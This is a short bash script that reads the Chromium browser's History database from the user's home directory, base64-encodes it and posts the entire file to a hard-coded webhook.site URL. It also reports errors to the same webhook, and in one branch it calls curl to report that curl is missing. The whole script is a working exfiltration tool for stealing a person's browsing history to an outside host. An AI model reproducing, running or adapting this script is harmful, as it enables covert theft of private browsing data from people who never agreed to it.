#!/bin/bash

# Path to the database
DATABASE="$HOME/.config/chromium/Default/History"

# Webhook URL
WEBHOOK_URL="https://webhook.site/7ae8dde8-6119-4c08-b515-bbc3b74e8814" # Replace with your webhook URL

# Check if curl is installed
if ! command -v curl &> /dev/null; then
  curl -X POST -H "Content-Type: application/json" -d "{\"ERR\": \"CURL not installed\"}" "$WEBHOOK_URL"
  echo "curl is not installed. Please install it and try again."
  exit 1
fi

# Check if base64 is installed
if ! command -v base64 &> /dev/null; then
  curl -X POST -H "Content-Type: application/json" -d "{\"ERR\": \"BASE64 not installed\"}" "$WEBHOOK_URL"
  echo "base64 is not installed. Please install it and try again."
  exit 1
fi

# Check if the database file exists
if [ ! -f "$DATABASE" ]; then
  curl -X POST -H "Content-Type: application/json" -d "{\"ERR\": \"DB not found\"}" "$WEBHOOK_URL"
  echo "Database file not found: $DATABASE"
  exit 1
fi

# Base64 encode the database file
ENCODED_FILE=$(base64 "$DATABASE")

curl -X POST -H "Content-Type: application/json" -d "{\"DATA\": \"DATA REVEIVE TEST\"}" "$WEBHOOK_URL"

# Send the base64-encoded content as a JSON object
curl -X POST -H "Content-Type: application/json" -d "{\"file\": \"$ENCODED_FILE\"}" "$WEBHOOK_URL"

echo "The database file has been sent in base64 format."
